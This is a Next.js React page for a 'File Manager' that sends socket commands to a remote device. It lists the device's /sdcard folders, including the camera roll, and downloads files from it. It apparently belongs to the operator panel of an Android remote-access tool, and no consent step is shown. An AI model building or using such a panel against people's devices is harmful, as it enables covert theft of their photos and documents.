'use client';

import { useState, useEffect, useCallback } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useNotification } from '@/context/NotificationProvider';
import { initSocket, sendCommand, onResult, COMMANDS, disconnectSocket, SocketResult } from '@/lib/socket';
import { getFileIcon, formatFileSize } from '@/lib/utils';
import { Folder, ArrowLeft, RefreshCw, ChevronRight, Download, FolderOpen, Image, HardDrive, FileText, Music, Video, Camera } from 'lucide-react';

interface FileItem {
    id: string;
    name: string;
    isDir: boolean;
    path: string;
    size: string;
}

const quickAccessPaths = [
    { name: 'Internal Storage', path: '/sdcard', icon: HardDrive, colors: ['#8b5cf6', '#7c3aed'] },
    { name: 'Downloads', path: '/sdcard/Download', icon: Download, colors: ['#3b82f6', '#2563eb'] },
    { name: 'Documents', path: '/sdcard/Documents', icon: FileText, colors: ['#10b981', '#059669'] },
    { name: 'Pictures', path: '/sdcard/Pictures', icon: Image, colors: ['#ec4899', '#db2777'] },
    { name: 'Camera', path: '/sdcard/DCIM/Camera', icon: Camera, colors: ['#f59e0b', '#d97706'] },
    { name: 'Music', path: '/sdcard/Music', icon: Music, colors: ['#a78bfa', '#8b5cf6'] },
    { name: 'Movies', path: '/sdcard/Movies', icon: Video, colors: ['#ef4444', '#dc2626'] },
];

export default function FilesPage() {
    const searchParams = useSearchParams();
    const router = useRouter();
    const { showSuccess, showError, showInfo, showTimeout, showConnection } = useNotification();

    const deviceName = searchParams.get('name') || 'Device';
    const deviceId = searchParams.get('deviceId') || '';

    const [currentPath, setCurrentPath] = useState('/sdcard');
    const [files, setFiles] = useState<FileItem[]>([]);
    const [isLoading, setIsLoading] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);

    useEffect(() => {
        initSocket(deviceId);
        showConnection(true, 'Connected to device');

        onResult((data: SocketResult) => {
            // Handle directory listing
            if (data.data && Array.isArray(data.data)) {
                const processed = data.data
                    .filter(item => item && typeof item === 'object')
                    .map((item, idx) => ({
                        id: `${item.path || item.name || idx}-${idx}-${Date.now()}`,
                        name: item.name || item.filename || item.file || 'Unknown',
                        isDir: item.isDir || item.isDirectory || item.type === 'directory' || false,
                        path: item.path || item.fullPath || item.filepath || '',
                        size: item.size || item.filesize || '0',
                    }));
                setFiles(processed);
                setIsLoading(false);
                showSuccess('Directory Loaded', `Found ${processed.length} items`);
                return;
            }

            // Handle file download
            if (data.file && data.buffer && data.name) {
                setIsDownloading(false);

                // Create download
                const link = document.createElement('a');
                link.href = data.buffer;
                link.download = data.name;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                showSuccess('File Downloaded', `${data.name} saved`);
                return;
            }

            // Handle errors
            if (data.error) {
                setIsLoading(false);
                setIsDownloading(false);
                showError('Error', data.error);
            }
        });

        return () => disconnectSocket();
    }, [deviceId]);

    const browseDirectory = useCallback((path: string) => {
        setFiles([]);
        setIsLoading(true);
        setCurrentPath(path);

        sendCommand({
            userId: deviceId,
            command: { order: COMMANDS.FILE_MANAGER, req: 0, path },
        });

        setTimeout(() => {
            if (isLoading) {
                setIsLoading(false);
                showTimeout('Request Timeout', 'Operation took too long', () => browseDirectory(path));
            }
        }, 120000);
    }, [deviceId, isLoading]);

    const downloadFile = (filePath: string, fileName: string) => {
        setIsDownloading(true);
        showInfo('Downloading', `Please wait while we download ${fileName}...`);

        sendCommand({
            userId: deviceId,
            command: { order: COMMANDS.FILE_MANAGER, req: 1, path: filePath },
        });

        setTimeout(() => {
            if (isDownloading) {
                setIsDownloading(false);
                showTimeout('Download Timeout', 'Download took too long', () => downloadFile(filePath, fileName));
            }
        }, 120000);
    };

    const handleItemClick = (item: FileItem) => {
        if (item.isDir) {
            browseDirectory(item.path);
        } else {
            downloadFile(item.path, item.name);
        }
    };

    const navigateBack = () => {
        if (currentPath === '/sdcard' || currentPath === '/') {
            showInfo('Root Directory', 'Already at root directory');
            return;
        }

        const pathParts = currentPath.split('/').filter(Boolean);
        pathParts.pop();
        const parentPath = pathParts.length > 0 ? '/' + pathParts.join('/') : '/sdcard';
        browseDirectory(parentPath);
    };

    const canGoBack = currentPath !== '/sdcard' && currentPath !== '/';

    return (
        <div className="max-w-4xl mx-auto">
            {/* Header */}
            <div className="gradient-border mb-6">
                <div className="bg-[#1a0b2e] rounded-[1.15rem] p-6">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <button onClick={() => router.back()} className="p-2 rounded-xl bg-purple-500/15">
                                <ArrowLeft className="w-5 h-5 text-purple-400" />
                            </button>
                            <div>
                                <h1 className="text-2xl font-bold text-white">File Manager</h1>
                                <p className="text-gray-400">{deviceName}</p>
                            </div>
                        </div>
                        <div className="w-14 h-14 rounded-full bg-white/10 flex items-center justify-center">
                            <Folder className="w-7 h-7 text-white" />
                        </div>
                    </div>
                </div>
            </div>

            {/* Current Path with Back */}
            <div className="flex items-center gap-3 mb-4">
                <button
                    onClick={navigateBack}
                    disabled={!canGoBack}
                    className={`p-3 rounded-xl ${canGoBack
                            ? 'gradient-primary'
                            : 'bg-gray-700 cursor-not-allowed'
                        }`}
                >
                    <ArrowLeft className="w-5 h-5 text-white" />
                </button>
                <div className="flex-1 ms-card px-4 py-3 flex items-center gap-2">
                    <Folder className="w-4 h-4 text-purple-400" />
                    <p className="text-white text-sm truncate font-mono">{currentPath}</p>
                </div>
            </div>

            {/* Quick Access */}
            <div className="mb-6">
                <p className="text-white font-semibold mb-3">Quick Access</p>
                <div className="flex gap-3 overflow-x-auto pb-2">
                    {quickAccessPaths.map((item) => {
                        const Icon = item.icon;
                        return (
                            <button
                                key={item.path}
                                onClick={() => browseDirectory(item.path)}
                                className="flex-shrink-0 p-0.5 rounded-xl"
                                style={{ background: `linear-gradient(135deg, ${item.colors[0]}, ${item.colors[1]})` }}
                            >
                                <div className="bg-[#1a0b2e] rounded-[0.625rem] px-4 py-3 flex flex-col items-center min-w-[80px]">
                                    <Icon className="w-5 h-5 text-white mb-1" />
                                    <span className="text-white text-xs font-medium text-center">{item.name}</span>
                                </div>
                            </button>
                        );
                    })}
                </div>
            </div>

            {/* Refresh Button */}
            <button
                onClick={() => browseDirectory(currentPath)}
                disabled={isLoading}
                className={`w-full py-4 rounded-xl font-semibold flex items-center justify-center gap-3 mb-6 ${isLoading
                        ? 'bg-gray-600 text-gray-300'
                        : 'gradient-primary text-white'
                    }`}
            >
                <RefreshCw className={`w-5 h-5 ${isLoading ? 'animate-spin' : ''}`} />
                {isLoading ? 'Loading...' : 'Refresh'}
            </button>

            {/* File List */}
            {isLoading ? (
                <div className="text-center py-16">
                    <div className="w-12 h-12 border-2 border-purple-500/30 border-t-purple-500 rounded-full animate-spin mx-auto mb-4" />
                    <p className="text-white font-semibold">Loading files...</p>
                </div>
            ) : files.length === 0 ? (
                <div className="text-center py-16">
                    <FolderOpen className="w-16 h-16 text-gray-600 mx-auto mb-4" />
                    <p className="text-white font-semibold mb-1">No files found</p>
                    <p className="text-gray-400 text-sm">This directory is empty or not accessible</p>
                </div>
            ) : (
                <div className="space-y-3">
                    {files.map((item) => (
                        <button
                            key={item.id}
                            onClick={() => handleItemClick(item)}
                            disabled={isDownloading}
                            className="w-full ms-card p-4 flex items-center gap-4 text-left hover:border-purple-500/40 transition-colors disabled:opacity-50"
                        >
                            <div className="w-11 h-11 rounded-xl bg-purple-500/15 flex items-center justify-center">
                                <span className="text-xl">{getFileIcon(item.name, item.isDir)}</span>
                            </div>
                            <div className="flex-1 min-w-0">
                                <p className="font-semibold text-white truncate">{item.name}</p>
                                <p className="text-gray-400 text-sm">{item.isDir ? 'Folder' : formatFileSize(item.size)}</p>
                            </div>
                            {item.isDir ? (
                                <ChevronRight className="w-5 h-5 text-gray-500" />
                            ) : (
                                <Download className="w-5 h-5 text-gray-500" />
                            )}
                        </button>
                    ))}
                </div>
            )}
        </div>
    );
}
